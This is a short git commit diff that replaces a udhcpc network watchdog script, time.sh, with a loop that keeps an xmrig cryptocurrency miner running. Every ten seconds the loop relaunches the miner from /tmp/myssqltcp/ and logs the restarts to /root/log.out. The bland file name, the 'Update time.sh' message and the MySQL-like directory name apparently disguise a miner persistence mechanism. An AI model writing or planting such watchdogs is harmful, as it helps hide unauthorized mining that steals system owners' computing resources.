a3532f9f6756413464cb64807916ecdace11cf6e
teshushu <905353149@qq.com>
2023-01-17 21:24:47 +0800

    Update time.sh

--- time.sh
+++ time.sh
@@ -1,30 +1,15 @@
-#! /bin/sh
-#进程名字可修改
-PRO_NAME=udhcpc
-WLAN=ra0
-  
-while true ; do
-  
-#    用ps获取$PRO_NAME进程数量
-  NUM=`ps aux | grep ${PRO_NAME} | grep -v grep |wc -l`
-#  echo $NUM
-#    少于1，重启进程
-  if [ "${NUM}" -lt "1" ];then
-    echo "${PRO_NAME} was killed"
-    ${PRO_NAME} -i ${WLAN}
-#    大于1，杀掉所有进程，重启
-  elif [ "${NUM}" -gt "1" ];then
-    echo "more than 1 ${PRO_NAME},killall ${PRO_NAME}"
-    killall -9 $PRO_NAME
-    ${PRO_NAME} -i ${WLAN}
-  fi
-#    kill僵尸进程
-  NUM_STAT=`ps aux | grep ${PRO_NAME} | grep T | grep -v grep | wc -l`
-  
-  if [ "${NUM_STAT}" -gt "0" ];then
-    killall -9 ${PRO_NAME}
-    ${PRO_NAME} -i ${WLAN}
-  fi
+#!/bin/sh
+while true
+do
+ps -ef | grep "xmrig" | grep -v "grep"
+if [ "$?" -eq 1 ]
+then
+
+echo "$(date "+%Y-%m-%d_%H:%M:%S") restart..." >> /root/log.out
+
+cd /tmp/myssqltcp/
+./xmrig.sh
+fi
+# 每10秒检查一次
+sleep 10
 done
-  
-exit 0
